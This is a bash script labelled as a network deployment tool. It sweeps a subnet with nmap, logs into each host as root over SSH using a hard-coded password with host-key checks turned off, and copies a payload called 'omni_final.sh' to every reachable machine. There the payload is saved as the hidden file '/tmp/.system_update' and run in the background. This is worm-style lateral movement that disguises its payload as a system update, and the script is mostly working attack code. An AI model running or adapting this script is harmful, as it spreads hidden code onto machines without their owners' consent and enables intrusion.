#!/bin/bash
# Automated network deployment

TARGET_SUBNET="192.168.1.0/24"
SSH_USER="root"
SSH_PASS="password"  # Change this!

echo "[*] Deploying Omni to network: $TARGET_SUBNET"

# Scan and deploy
nmap -sn $TARGET_SUBNET | grep "Nmap scan report" | awk '{print $NF}' | while read ip; do
    echo "[*] Attempting deployment to $ip"
    
    # Try SSH deployment
    if sshpass -p "SSH_PASSWORD_PLACEHOLDER" ssh -o StrictHostKeyChecking=no \
       -o ConnectTimeout=5 "$SSH_USER@$ip" "uname -a" >/dev/null 2>&1; then
        
        echo "[+] SSH accessible on $ip"
        
        # Copy payload
        sshpass -p "SSH_PASSWORD_PLACEHOLDER" scp -o StrictHostKeyChecking=no \
                payloads/v1.0/omni_final.sh "$SSH_USER@$ip:/tmp/.system_update"
        
        # Execute
        sshpass -p "SSH_PASSWORD_PLACEHOLDER" ssh -o StrictHostKeyChecking=no \
                "$SSH_USER@$ip" "chmod +x /tmp/.system_update && /tmp/.system_update &"
        
        echo "[✓] Deployed to $ip"
    else
        echo "[-] SSH failed on $ip"
    fi
done

echo "[*] Deployment complete"
